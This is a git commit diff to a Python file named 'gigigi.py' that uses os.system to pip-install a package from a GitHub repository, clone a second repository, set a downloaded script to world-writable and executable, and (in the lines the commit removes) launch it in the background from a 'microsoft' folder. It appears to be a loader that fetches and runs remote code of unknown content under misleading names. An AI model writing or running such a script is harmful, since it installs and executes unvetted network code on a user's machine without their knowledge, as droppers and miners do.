95bb1b18f9b0f9f86e2dfb970f88cfab84a03709
reolosi <82867208+reolosi@users.noreply.github.com>
2021-05-16 23:41:08 +0530

    Update gigigi.py

--- gigigi.py
+++ gigigi.py
@@ -1,5 +1,5 @@
 import os
 os.system("pip3 install git+https://github.com/reolosi/eisof12.git")
 os.system("git clone https://github.com/reolosi/relotpv.git")
-os.system("chmod 777 relotpv/micros.py ")
-os.system("./microsoft/micros.py &")
+os.system("chmod 777 relotpv/hroewp.py ")
+
